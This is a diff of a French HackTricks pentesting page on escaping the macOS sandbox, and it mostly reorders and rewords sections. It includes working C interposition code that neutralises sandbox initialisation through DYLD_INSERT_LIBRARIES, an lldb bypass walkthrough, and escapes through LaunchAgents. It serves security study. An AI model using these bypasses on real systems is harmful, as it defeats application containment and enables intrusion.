@@ -4,7 +4,7 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
@@ -16,26 +16,152 @@
 
 <figure><img src="../../../../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption><p>Image de <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>
 
-Dans l'image précédente, il est possible d'observer **comment le bac à sable sera chargé** lorsqu'une application avec l'entitlement **`com.apple.security.app-sandbox`** est exécutée.
+Sur l'image précédente, il est possible d'observer **comment le bac à sable sera chargé** lorsqu'une application avec l'attribution **`com.apple.security.app-sandbox`** est exécutée.
 
 Le compilateur liera `/usr/lib/libSystem.B.dylib` au binaire.
 
-Ensuite, **`libSystem.B`** appellera plusieurs autres fonctions jusqu'à ce que **`xpc_pipe_routine`** envoie les entitlements de l'application à **`securityd`**. Securityd vérifie si le processus doit être mis en quarantaine à l'intérieur du bac à sable, et le cas échéant, il sera mis en quarantaine.\
+Ensuite, **`libSystem.B`** appellera plusieurs autres fonctions jusqu'à ce que **`xpc_pipe_routine`** envoie les attributions de l'application à **`securityd`**. Securityd vérifie si le processus doit être mis en quarantaine à l'intérieur du bac à sable, et le cas échéant, il sera mis en quarantaine.\
 Enfin, le bac à sable sera activé par un appel à **`__sandbox_ms`** qui appellera **`__mac_syscall`**.
 
 ## Possibles contournements
 
-{% hint style="warning" %}
-Notez que les **fichiers créés par des processus en bac à sable** se voient attribuer l'**attribut de quarantaine** pour empêcher les évasions du bac à sable.
-{% endhint %}
+### Contournement de l'attribut de quarantaine
 
-### Exécuter un binaire sans bac à sable
+Les **fichiers créés par des processus en bac à sable** se voient attribuer l'**attribut de quarantaine** pour empêcher leur évasion du bac à sable. Cependant, si vous parvenez à **créer un bundle `.app` sans l'attribut de quarantaine** à l'intérieur d'une application en bac à sable, vous pourriez faire en sorte que le binaire du bundle d'application pointe vers **`/bin/bash`** et ajouter quelques variables d'environnement dans le **plist** pour abuser de launchctl afin de **lancer la nouvelle application sans bac à sable**.
 
-Si vous exécutez un binaire qui ne sera pas mis en bac à sable à partir d'un binaire mis en bac à sable, il **s'exécutera dans le bac à sable du processus parent**.
+C'est ce qui a été fait dans [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
 
+### Abus de la fonctionnalité Open
+
+Dans les [**derniers exemples de contournement du bac à sable Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv), on peut voir comment la fonctionnalité **`open`** de la ligne de commande peut être utilisée pour contourner le bac à sable.
+
+### Abus des emplacements de démarrage automatique
+
+Si un processus en bac à sable peut **écrire** dans un emplacement où **ultérieurement une application sans bac à sable va exécuter le binaire**, il pourra **s'échapper simplement en plaçant** le binaire là-bas. Un bon exemple de ce type d'emplacements sont `~/Library/LaunchAgents` ou `/System/Library/LaunchDaemons`.
+
+Pour cela, vous pourriez même avoir besoin de **2 étapes** : faire en sorte qu'un processus avec un **bac à sable plus permissif** (`file-read*`, `file-write*`) exécute votre code qui écrira effectivement à un endroit où il sera **exécuté sans bac à sable**.
+
+Consultez cette page sur les **emplacements de démarrage automatique** :
+
+{% content-ref url="../../../../macos-auto-start-locations.md" %}
+[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
+{% endcontent-ref %}
+
+### Abus d'autres processus
+
+Si à partir du processus en bac à sable, vous parvenez à **compromettre d'autres processus** s'exécutant dans des bacs à sable moins restrictifs (ou sans bac à sable), vous pourrez vous échapper vers leurs bacs à sable :
+
+{% content-ref url="../../../macos-proces-abuse/" %}
+[macos-proces-abuse](../../../macos-proces-abuse/)
+{% endcontent-ref %}
+
+### Compilation statique et liaison dynamique
+
+[**Cette recherche**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) a découvert 2 façons de contourner le bac à sable. Parce que le bac à sable est appliqué depuis l'espace utilisateur lorsque la bibliothèque **libSystem** est chargée. Si un binaire pouvait éviter de la charger, il ne serait jamais mis en bac à sable :
+
+* Si le binaire était **complètement compilé en statique**, il pourrait éviter de charger cette bibliothèque.
+* Si le **binaire n'avait pas besoin de charger de bibliothèques** (parce que le lien est également dans libSystem), il n'aurait pas besoin de charger libSystem.&#x20;
+
+### Shellcodes
+
+Notez que **même les shellcodes** en ARM64 doivent être liés à `libSystem.dylib` :
+```bash
+ld -o shell shell.o -macosx_version_min 13.0
+ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
+```
+### Autorisations
+
+Notez que même si certaines **actions** peuvent être **autorisées par le sandbox**, si une application dispose d'une **autorisation spécifique**, comme dans l'exemple suivant :
+```scheme
+(when (entitlement "com.apple.security.network.client")
+(allow network-outbound (remote ip))
+(allow mach-lookup
+(global-name "com.apple.airportd")
+(global-name "com.apple.cfnetwork.AuthBrokerAgent")
+(global-name "com.apple.cfnetwork.cfnetworkagent")
+[...]
+```
+### Contournement de l'interposition
+
+Pour plus d'informations sur l'**interposition**, consultez :
+
+{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
+[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
+{% endcontent-ref %}
+
+#### Interposer `_libsecinit_initializer` pour éviter le sandbox
+```c
+// gcc -dynamiclib interpose.c -o interpose.dylib
+
+#include <stdio.h>
+
+void _libsecinit_initializer(void);
+
+void overriden__libsecinit_initializer(void) {
+printf("_libsecinit_initializer called\n");
+}
+
+__attribute__((used, section("__DATA,__interpose"))) static struct {
+void (*overriden__libsecinit_initializer)(void);
+void (*_libsecinit_initializer)(void);
+}
+_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
+```
+
+```bash
+DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
+_libsecinit_initializer called
+Sandbox Bypassed!
+```
+#### Interposer `__mac_syscall` pour contourner le Sandbox
+
+{% code title="interpose.c" %}
+```c
+// gcc -dynamiclib interpose.c -o interpose.dylib
+
+#include <stdio.h>
+#include <string.h>
+
+// Forward Declaration
+int __mac_syscall(const char *_policyname, int _call, void *_arg);
+
+// Replacement function
+int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
+printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
+if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
+printf("Bypassing Sandbox initiation.\n");
+return 0; // pretend we did the job without actually calling __mac_syscall
+}
+// Call the original function for other cases
+return __mac_syscall(_policyname, _call, _arg);
+}
+
+// Interpose Definition
+struct interpose_sym {
+const void *replacement;
+const void *original;
+};
+
+// Interpose __mac_syscall with my_mac_syscall
+__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
+{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
+};
+```
+{% endcode %}
+```bash
+DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
+
+__mac_syscall invoked. Policy: Sandbox, Call: 2
+__mac_syscall invoked. Policy: Sandbox, Call: 2
+__mac_syscall invoked. Policy: Sandbox, Call: 0
+Bypassing Sandbox initiation.
+__mac_syscall invoked. Policy: Quarantine, Call: 87
+__mac_syscall invoked. Policy: Sandbox, Call: 4
+Sandbox Bypassed!
+```
 ### Déboguer et contourner le bac à sable avec lldb
 
-Compilons une application qui devrait être mise en bac à sable :
+Compilons une application qui devrait être sandboxée :
 
 {% tabs %}
 {% tab title="sand.c" %}
@@ -75,7 +201,7 @@ Dans cet exemple, l'application a les autorisations suivantes :
 - `com.apple.security.network.client` : autorise l'application à accéder au réseau.
 - `com.apple.security.print` : autorise l'application à imprimer.
 
-Ces autorisations peuvent être modifiées pour répondre aux besoins spécifiques de l'application, mais il est important de noter que la modification incorrecte des autorisations peut entraîner des problèmes de sécurité ou de fonctionnalité.
+Ces autorisations peuvent être utilisées pour restreindre les actions qu'une application peut effectuer et renforcer la sécurité du système macOS.
 
 {% endtab %}
 ```xml
@@ -94,7 +220,9 @@ Dans le contexte du sandboxing, le fichier Info.plist est utilisé pour déclare
 
 Il est important de noter que le fichier Info.plist est signé numériquement pour garantir son intégrité et empêcher toute modification non autorisée. La signature numérique est vérifiée par le système d'exploitation lors du lancement de l'application.
 
-Lors de l'analyse d'une application macOS, il est essentiel de vérifier le contenu du fichier Info.plist pour comprendre les autorisations demandées par l'application et évaluer les risques potentiels liés à ces autorisations.
+La modification du fichier Info.plist peut être utilisée comme une technique de contournement du sandboxing. En modifiant les autorisations déclarées dans le fichier Info.plist, un attaquant peut potentiellement accéder à des ressources système auxquelles l'application n'est pas censée avoir accès. Cependant, cette technique nécessite des privilèges élevés et peut être détectée par les mécanismes de sécurité du système d'exploitation.
+
+Il est donc essentiel de s'assurer que le fichier Info.plist est correctement configuré et que les autorisations déclarées sont appropriées pour l'application. Cela contribue à renforcer la sécurité du sandboxing et à prévenir les éventuelles violations de la sécurité.
 ```xml
 <plist version="1.0">
 <dict>
@@ -123,8 +251,8 @@ codesign -s <cert-name> --entitlements entitlements.xml sand
 {% endcode %}
 
 {% hint style="danger" %}
-L'application essaiera de **lire** le fichier **`~/Desktop/del.txt`**, que le **Sandbox n'autorisera pas**.\
-Créez un fichier là-bas car une fois que le Sandbox est contourné, il pourra le lire :
+L'application essaiera de **lire** le fichier **`~/Desktop/del.txt`**, ce que le **Sandbox n'autorisera pas**.\
+Créez un fichier à cet endroit car une fois que le Sandbox est contourné, il pourra le lire :
 ```bash
 echo "Sandbox Bypassed" > ~/Desktop/del.txt
 ```
@@ -204,135 +332,11 @@ libsystem_kernel.dylib`:
 (lldb) c
 Processus 2517 en cours de reprise
 Contournement du bac à sable réussi !
-Processus 2517 terminé avec le statut = 0 (0x00000000)
+Le processus 2517 s'est terminé avec le statut = 0 (0x00000000)
 ```
 {% hint style="warning" %}
 **Même si le Sandbox est contourné, TCC** demandera à l'utilisateur s'il souhaite autoriser le processus à lire les fichiers du bureau.
 {% endhint %}
-
-### Abus d'autres processus
-
-Si à partir du processus Sandbox, vous parvenez à **compromettre d'autres processus** s'exécutant dans des sandboxes moins restrictives (ou aucune), vous pourrez échapper à leurs sandboxes :
-
-{% content-ref url="../../../macos-proces-abuse/" %}
-[macos-proces-abuse](../../../macos-proces-abuse/)
-{% endcontent-ref %}
-
-### Contournement de l'interposition
-
-Pour plus d'informations sur l'**interposition**, consultez :
-
-{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
-[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
-{% endcontent-ref %}
-
-#### Interposer `_libsecinit_initializer` pour empêcher le sandbox
-```c
-// gcc -dynamiclib interpose.c -o interpose.dylib
-
-#include <stdio.h>
-
-void _libsecinit_initializer(void);
-
-void overriden__libsecinit_initializer(void) {
-printf("_libsecinit_initializer called\n");
-}
-
-__attribute__((used, section("__DATA,__interpose"))) static struct {
-void (*overriden__libsecinit_initializer)(void);
-void (*_libsecinit_initializer)(void);
-}
-_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
-```
-
-```bash
-DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
-_libsecinit_initializer called
-Sandbox Bypassed!
-```
-#### Interposer `__mac_syscall` pour contourner le Sandbox
-
-{% code title="interpose.c" %}
-```c
-// gcc -dynamiclib interpose.c -o interpose.dylib
-
-#include <stdio.h>
-#include <string.h>
-
-// Forward Declaration
-int __mac_syscall(const char *_policyname, int _call, void *_arg);
-
-// Replacement function
-int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
-printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
-if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
-printf("Bypassing Sandbox initiation.\n");
-return 0; // pretend we did the job without actually calling __mac_syscall
-}
-// Call the original function for other cases
-return __mac_syscall(_policyname, _call, _arg);
-}
-
-// Interpose Definition
-struct interpose_sym {
-const void *replacement;
-const void *original;
-};
-
-// Interpose __mac_syscall with my_mac_syscall
-__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
-{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
-};
-```
-{% endcode %}
-```bash
-DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
-
-__mac_syscall invoked. Policy: Sandbox, Call: 2
-__mac_syscall invoked. Policy: Sandbox, Call: 2
-__mac_syscall invoked. Policy: Sandbox, Call: 0
-Bypassing Sandbox initiation.
-__mac_syscall invoked. Policy: Quarantine, Call: 87
-__mac_syscall invoked. Policy: Sandbox, Call: 4
-Sandbox Bypassed!
-```
-### Compilation statique et liaison dynamique
-
-[**Cette recherche**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) a découvert 2 façons de contourner le bac à sable. Étant donné que le bac à sable est appliqué depuis l'espace utilisateur lorsque la bibliothèque **libSystem** est chargée. Si un binaire pouvait éviter de la charger, il ne serait jamais mis en bac à sable :
-
-* Si le binaire était **complètement compilé de manière statique**, il pourrait éviter de charger cette bibliothèque.
-* Si le **binaire n'avait pas besoin de charger de bibliothèques** (car le lien est également dans libSystem), il n'aurait pas besoin de charger libSystem.&#x20;
-
-### Shellcodes
-
-Notez que **même les shellcodes** en ARM64 doivent être liés à `libSystem.dylib`:
-```bash
-ld -o shell shell.o -macosx_version_min 13.0
-ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
-```
-### Autorisations
-
-Notez que même si certaines **actions** peuvent être **autorisées par le sandbox**, si une application dispose d'une **autorisation spécifique**, comme dans l'exemple suivant :
-```scheme
-(when (entitlement "com.apple.security.network.client")
-(allow network-outbound (remote ip))
-(allow mach-lookup
-(global-name "com.apple.airportd")
-(global-name "com.apple.cfnetwork.AuthBrokerAgent")
-(global-name "com.apple.cfnetwork.cfnetworkagent")
-[...]
-```
-### Abus des emplacements de démarrage automatique
-
-Si un processus en bac à sable peut **écrire** dans un emplacement où **ultérieurement une application non en bac à sable va exécuter le binaire**, il pourra **s'échapper simplement en y plaçant** le binaire. Un bon exemple de ce type d'emplacements sont `~/Library/LaunchAgents` ou `/System/Library/LaunchDaemons`.
-
-Pour cela, vous pourriez même avoir besoin de **2 étapes** : faire en sorte qu'un processus avec un **bac à sable plus permissif** (`file-read*`, `file-write*`) exécute votre code qui écrira effectivement dans un emplacement où il sera **exécuté sans bac à sable**.
-
-Consultez cette page sur les **emplacements de démarrage automatique** :
-
-{% content-ref url="../../../../macos-auto-start-locations.md" %}
-[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
-{% endcontent-ref %}
 
 ## Références
 
@@ -344,7 +348,7 @@ Consultez cette page sur les **emplacements de démarrage automatique** :
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Vous travaillez dans une **entreprise de cybersécurité** ? Vous souhaitez voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
